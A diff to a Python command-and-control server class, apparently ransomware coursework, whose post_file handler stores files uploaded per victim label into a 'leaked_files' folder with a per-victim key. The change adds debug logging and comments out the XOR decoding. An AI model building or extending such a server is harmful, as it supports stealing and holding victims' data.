@@ -55,8 +55,13 @@ class CNC(CNCBase):
         return {"status":"OK"}
 
     def post_file(self, path: str, params: dict, body: bytes) -> dict:
+        self._log.debug(path)
+        self._log.debug(params)
+        self._log.debug(body)
+
         label = params['label']
         file_name = params['file_name']
+
 
         key_path = f"{CNC.ROOT_PATH}/{label}/key.bin"
         new_path = f"{CNC.ROOT_PATH}/{label}/leaked_files"
@@ -68,16 +73,13 @@ class CNC(CNCBase):
         with open(key_path, 'rb') as key_file:
             key = key_file.read()
             self._log.debug(key)
-            key_file.close()
-        
+
         # file_path = f"{new_path}/{file_name}.bin"
         with open(file_path, "wb") as data_file:
             # bin_data is written into data_file
             data_file.write(body)
-            data_file.close()
 
-        xorfile(file_path, key)
-        xorfile(file_path, key)
+        # xorfile(file_path, key)
 
         return {"status":"OK"}
 
